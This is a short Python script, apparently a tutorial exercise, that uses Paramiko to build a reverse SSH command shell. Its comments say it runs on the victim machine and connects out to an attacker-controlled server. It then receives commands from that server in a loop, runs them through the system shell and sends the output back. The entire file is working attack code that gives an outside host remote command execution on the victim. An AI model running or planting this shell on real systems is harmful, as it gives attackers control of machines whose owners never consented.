# SSH command execution tool that uses the Paramiko library to connect to a remote SSH server controlled by the attacker

import paramiko # Python SSHv2
import shlex # parses cmd line strings
import subprocess # for spawning and interacting with processes

def ssh_command(ip, port, user, passwd, command):
    # establish the connection
    client = paramiko.SSHClient() # creates an object (client) that will manage the SSH connection state
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically accepts remote server host keys to the local system
    client.connect(ip, port=port, username=user, password=passwd) # uses .connect (paramiko method) to connect to target server

    # open the session, send/receive initial signal
    ssh_session = client.get_transport().open_session() # opens the session
    if ssh_session.active: # was session successfully established?
        ssh_session.send(command) # sends initial message string
        print(ssh_session.recv(1024).decode()) # receives and decodes response data

        # command execution loop
        while True:
            command = ssh_session.recv(1024) # the attacked machine listens for commands from the attacker
            try: 
                cmd = command.decode()
                if cmd == 'exit': 
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) #uses shlex to parse commands and executes via the system's shell
                ssh_session.send(cmd_output or 'okay') #sends back the cmd execution output, or if no output sends back 'okay'
            except Exception as e:
                ssh_session.send(str(e)) # sends any error messages back
        client.close() 
    return
    
# this script is run from the victim machine
if __name__ == '__main__':
    # entry point
    import getpass # getpass module securely handles sensitive input
    user = getpass.getuser() # retrieves current system username
    password = getpass.getpass() # prompts user for a password

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
